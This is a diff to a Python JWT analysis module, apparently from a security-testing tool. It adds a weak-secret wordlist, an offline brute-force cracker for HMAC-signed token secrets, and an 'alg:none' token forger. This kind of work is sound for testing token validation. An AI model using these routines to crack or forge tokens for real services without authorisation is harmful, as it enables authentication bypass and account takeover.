@@ -9,8 +9,21 @@ traffic, so it is not scope-gated.
 from __future__ import annotations
 
 import base64
+import hashlib
+import hmac
 import json
 from dataclasses import dataclass, field
+
+_HS_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+
+# A compact default weak-secret list for the offline HMAC crack (framework
+# defaults + the usual suspects). Callers may pass a larger wordlist.
+WEAK_JWT_SECRETS: list[str] = [
+    "secret", "password", "changeme", "admin", "123456", "jwt", "token", "key",
+    "your-256-bit-secret", "your_jwt_secret", "supersecret", "secretkey", "s3cr3t",
+    "jwtsecret", "mysecret", "PleaseChangeMe", "private", "test", "dev", "qwerty",
+    "letmein", "default", "0", "null", "password123", "root",
+]
 
 
 @dataclass
@@ -26,6 +39,53 @@ class JwtAnalysis:
 def _b64url_decode(segment: str) -> bytes:
     pad = "=" * (-len(segment) % 4)
     return base64.urlsafe_b64decode(segment + pad)
+
+
+def _b64url_nopad(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")
+
+
+def crack_hmac_secret(token: str, wordlist: list[str] | None = None) -> str | None:
+    """Offline brute of an HS256/384/512 JWT signing secret against a wordlist.
+
+    Recomputes the HMAC over the signing input and constant-time-compares it to
+    the token's signature; returns the secret on a match, else None. A recovered
+    secret = the ability to forge ANY token. Sends no traffic."""
+
+    token = token.strip()
+    if token.lower().startswith("bearer "):
+        token = token[7:].strip()
+    parts = token.split(".")
+    if len(parts) != 3 or not parts[2]:
+        return None
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
+        return None
+    alg = header.get("alg") if isinstance(header, dict) else None
+    if not isinstance(alg, str) or alg.upper() not in _HS_ALGS:
+        return None
+    digest = _HS_ALGS[alg.upper()]
+    signing_input = f"{parts[0]}.{parts[1]}".encode()
+    for secret in (wordlist or WEAK_JWT_SECRETS):
+        sig = _b64url_nopad(hmac.new(secret.encode(), signing_input, digest).digest())
+        if hmac.compare_digest(sig, parts[2]):
+            return secret
+    return None
+
+
+def forge_alg_none(token: str) -> str:
+    """Re-encode *token*'s payload under an ``alg:none`` header with an empty
+    signature — the classic unverified-signature forgery, to test acceptance."""
+
+    token = token.strip()
+    if token.lower().startswith("bearer "):
+        token = token[7:].strip()
+    parts = token.split(".")
+    payload_seg = parts[1] if len(parts) >= 2 else _b64url_nopad(b"{}")
+    header_seg = _b64url_nopad(
+        json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
+    return f"{header_seg}.{payload_seg}."
 
 
 def analyze_jwt(token: str, now_epoch: int | None = None) -> JwtAnalysis:
